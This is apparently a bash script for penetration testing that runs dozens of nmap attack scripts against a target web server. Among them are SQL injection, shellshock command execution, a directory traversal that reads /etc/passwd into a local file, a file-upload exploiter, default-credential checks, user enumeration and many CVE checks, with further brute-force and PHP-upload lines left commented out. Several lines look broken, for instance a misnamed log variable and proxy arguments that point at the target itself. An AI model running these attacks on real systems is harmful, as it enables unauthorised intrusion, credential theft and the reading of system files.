#!/bin/bash          
IP=$1
PORT=${2:-80}
PROXY=$3
nmap_path=
LOGFILE=$IP_nmap_http_scan.log

if [ -z "$IP" -o -z "$PORT" ]
then
  echo "Usage: $0 host [port] [port]"
  echo "port defaults to 80."
  exit 1
fi
#Seg-fault and other issues.
#nmap --script http-passwd --script-args http-passwd.root=/test/ $IP
#nmap -p $PORT $IP --script http-put --script-args http-put.url='/uploads/rootme.php',http-#put.file='/tmp/rootme.php'
curl -vX OPTIONS $IP
nmap -sV --script=http-sql-injection -p $PORT $IP --proxy $IP:$PROXY
#nmap --script http-form-fuzzer -p $PORT --script-args 'http-form-fuzzer.targets={1={path=/},2={path=/register.html}}' $IP
#nmap -sV --script http-wordpress-brute $IP
#nmap -Pn --script http-userdir-enum $IP
#nmap -sV --script=http-webdav-scan $IP
#nmap -sV --script=http-vuln-wnr1000-creds $IP
#nmap -p $PORT --script http-adobe-coldfusion-apsa1301 --script-args basepath=/cf/adminapi/ $IP
nmap -sV --script=http-useragent-tester -p $PORT $IP --proxy $IP:$PROXY
#nmap -sV --script=http-iis-webdav-vuln $IP
#nmap -sV --script=http-exif-spider
#Work as expeced.
nmap -sV --script http-shellshock -p $PORT $IP --proxy $IP:$PROXY
nmap -sV --script http-shellshock --script-args uri=/cgi-bin/bin,cmd=ls -p $PORT $IP --proxy $IP:$PROXY
nmap -sV --script=http-userdir-enum -p $PORT $IP
nmap --script http-rfi-spider -p $PORT $IP
nmap -p 443 --script ssl-heartbleed $IP
nmap --script ssl-known-key -p 443 $IP
nmap -sV --version-light --script ssl-poodle -p 443 $IP
nmap -sV --script=http-php-version -p $PORT $IP
nmap -p $PORT --script http-phpmyadmin-dir-traversal --script-args="dir='/phpmyadmin/',file='../../../../../../../../etc/passwd',outfile='passwd.txt'" $IP
nmap -p $PORT --script http-phpmyadmin-dir-traversal $IP
nmap -p $PORT --script http-stored-xss.nse $IP
nmap -n -p $PORT --script http-ls $IP
nmap -sV --script http-joomla-brute -p $PORT $IP
nmap -sV --script=http-headers -p $PORT $IP
#nmap --script http-form-brute -p $PORT $IP
nmap -p $PORT --script http-fileupload-exploiter.nse $IP
nmap --script=http-drupal-enum-users --script-args http-drupal-enum-users.root="/path/" -p $PORT $IP
nmap -p $PORT --script http-drupal-enum $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-default-accounts $IP --proxy $IP:$PROXY
nmap --script=http-config-backup -p $PORT $IP --proxy $IP:$PROXY
nmap -sV --script http-coldfusion-subzero -p $PORT $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-coldfusion-subzero --script-args basepath=/cf/ $IP --proxy $IP:$PROXY
nmap --script http-auth [--script-args http-auth.path=/login] $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-waf-detect $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-waf-detect --script-args="http-waf-detect.aggro,http-waf-detect.uri=/testphp.vulnweb.com/artists.php" $IP --proxy $IP:$PROXY
nmap --script=http-waf-fingerprint -p $PORT $IP --proxy $IP:$PROXY
#nmap --script=http-waf-fingerprint --script-args http-waf-fingerprint.intensive=1 -p $PORT $IP
nmap -Pn --script http-comments-displayer -p $PORT $IP --proxy $IP:$PROXY
nmap -Pn --script http-sitemap-generator -p $PORT $IP --proxy $IP:$PROXY
nmap -Pn --script="ssl-*" -p $PORT $IP --proxy $IP:$PROXY
#nmap -sV --script http-wordpress-brute
#  --script-args 'userdb=users.txt,passdb=passwds.txt,http-wordpress-brute.hostname=domain.com,
#                 http-wordpress-brute.threads=3,brute.firstonly=true' $IP
nmap -sV --script http-wordpress-enum -p $PORT $IP --proxy $IP:$PROXY
nmap --script http-wordpress-enum --script-args type="themes" -p $PORT $IP
nmap -p $PORT --script http-wordpress-users $IP --proxy $IP:$PROXY
nmap -sV --script http-wordpress-users --script-args limit=50 -p $PORT $IP
nmap -p $PORT --script http-iis-short-name-brute $IP --proxy $IP:$PROXY
nmap -p $PORT --script  http-vmware-path-vuln $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2006-3392 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2010-0738 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2010-2861 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2011-3192 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2011-3368 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2012-1823 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2013-0156 $IP --proxy $IP:$PROXY
#nmap -p $PORT --script http-vuln-cve2013-6786 $IP
nmap -p $PORT --script http-vuln-cve2013-7091 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2014-2126 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2014-2127 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2014-2128 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2014-2129 $IP --proxy $IP:$PROXY
#nmap -p $PORT --script http-vuln-cve2014-3704 $IP
nmap -p $PORT --script http-vuln-cve2014-8877 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2015-1427 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-cve2015-1635 $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-misfortune-cookie $IP --proxy $IP:$PROXY
nmap -p $PORT --script http-vuln-wnr1000-creds $IP --proxy $IP:$PROXY
